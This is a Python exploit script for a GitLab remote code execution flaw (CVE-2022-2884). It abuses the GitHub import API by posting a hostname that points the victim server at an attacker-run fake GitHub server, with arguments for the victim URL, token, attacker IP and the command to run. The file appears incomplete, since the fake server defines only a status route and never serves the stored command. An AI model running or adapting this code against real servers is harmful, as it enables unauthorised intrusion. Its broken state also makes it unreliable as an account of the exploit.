#!/usr/bin/env python3

import argparse
import logging
import validators
import random
import string
import requests
import time

from flask import Flask, current_app, request
from multiprocessing import Process

DEFAULT_LOGGING_LEVEL = logging.INFO
app = Flask(__name__)

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Exploit for GitLab RCE vulnerability known as CVE-2022-2884."
    )
    parser.add_argument("-u", "--url",
                        required=True,
                        help="URL of the victim GitLab")
    parser.add_argument("-pt", "--private-token",
                        required=True,
                        help="private token of GitLab")
    parser.add_argument("-tn", "--target-namespace",
                        required=False,
                        default="root",
                        help="target namespace of GitLab")
    parser.add_argument("-a", "--address",
                        required=True,
                        help="IP address of the attacker machine")
    parser.add_argument("-p", "--port",
                        required=False,
                        type=int,
                        default=1337,
                        help="TCP port of the attacker machine")
    parser.add_argument("-c", "--command",
                        required=True,
                        help="the command to execute")
    parser.add_argument("-v", "--verbose",
                        action="store_true",
                        required=False,
                        default=False,
                        help="verbose mode")
    return parser.parse_args()

def validate_input(args):
    try:
        validators.url(args.url)
    except validators.ValidationFailure:
        raise ValueError("Invalid target URL!")
    
    if len(args.private_token.strip()) < 1:
        raise ValueError("Invalid GitLab private token!")

    if len(args.target_namespace.strip()) < 1:
        raise ValueError("Invalid GitLab target namespace!")

    try:
        validators.ipv4(args.address)
    except validators.ValidationFailure:
        raise ValueError("Invalid attacker IP address!")
    
    if args.port < 1 or args.port > 65535:
        raise ValueError("Invalid attacker TCP port!")
    
    if len(args.command.strip()) < 1:
        raise ValueError("Invalid command!")

def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def generate_random_number(length):
    letters = string.digits
    result = "0"
    while result.startswith("0"):
        result = ''.join(random.choice(letters) for i in range(length))
    return result

def send_request(url, private_token, target_namespace, address, port, fake_repo_id):
    logging.info("[*] Sending request to target GitLab.")
    headers = {
        "Content-Type": "application/json",
        "PRIVATE-TOKEN": f"{private_token}"
    }
    payload = {
        "personal_access_token": f"{private_token}",
        "repo_id": f"{fake_repo_id}",
        "target_namespace": f"{target_namespace}",
        "new_name": generate_random_string(8),
        "github_hostname": f"http://{address}:{port}"
    }
    target_endpoint = f"{url}"
    if not target_endpoint.endswith("/"):
        target_endpoint = f"{target_endpoint}/"
    target_endpoint = f"{target_endpoint}api/v4/import/github"
    r = requests.post(target_endpoint, headers=headers, json=payload)
    logging.debug("[*] Response:")
    logging.debug(f"[*] status_code = {r.status_code}")
    logging.debug(f"[*]        text = {r.text}")
    logging.info(f"[*] Request sent to target GitLab (HTTP {r.status_code}).")

def is_server_alive(port):
    r = requests.get(f"http://localhost:{port}/")
    if r.status_code == 200 and "The server is running." in r.text:
        return True
    else:
        return False

def start_fake_github_server(address, port, command, fake_repo_id):
    app.config["address"] = address
    app.config["port"] = port
    app.config["command"] = command
    app.config["fake_repo_id"] = fake_repo_id
    app.run("0.0.0.0", port)

@app.before_request
def received_request():
    logging.debug(f"[*] Received request:")
    logging.debug(f"[*]     url = {request.url}")
    logging.debug(f"[*] headers = {request.headers}")

@app.route("/")
def index():
    return "The server is running."

def main():
    args = parse_arguments()
    logging_level = DEFAULT_LOGGING_LEVEL
    if args.verbose:
        logging_level = logging.DEBUG
    logging.basicConfig(level=logging_level, format="%(asctime)s - %(levelname)s - %(message)s")

    validate_input(args)
    url = args.url
    private_token = args.private_token
    target_namespace = args.target_namespace
    address = args.address
    port = args.port
    command = args.command
    logging.info("Exploit for GitLab RCE vulnerability known as CVE-2022-2884. Written by m3ssap0.")
    logging.debug("[*] Parameters:")
    logging.debug(f"[*]              url = {url}")
    logging.debug(f"[*]    private_token = {private_token}")
    logging.debug(f"[*] target_namespace = {target_namespace}")
    logging.debug(f"[*]          address = {address}")
    logging.debug(f"[*]             port = {port}")
    logging.debug(f"[*]          command = {command}")

    fake_repo_id = generate_random_number(9)

    fake_github_server = Process(target=start_fake_github_server, args=(address, port, command, fake_repo_id,))
    fake_github_server.start()

    logging.info("[*] Waiting for the fake GitHub server to start.")
    while not is_server_alive(port):
        time.sleep(1)
        logging.debug("[*] Waiting for the fake GitHub server to start.")
    logging.info("[*] Fake GitHub server is running.")

    send_request(url, private_token, target_namespace, address, port, fake_repo_id)

    fake_github_server.kill()

if __name__ == "__main__":
    main()
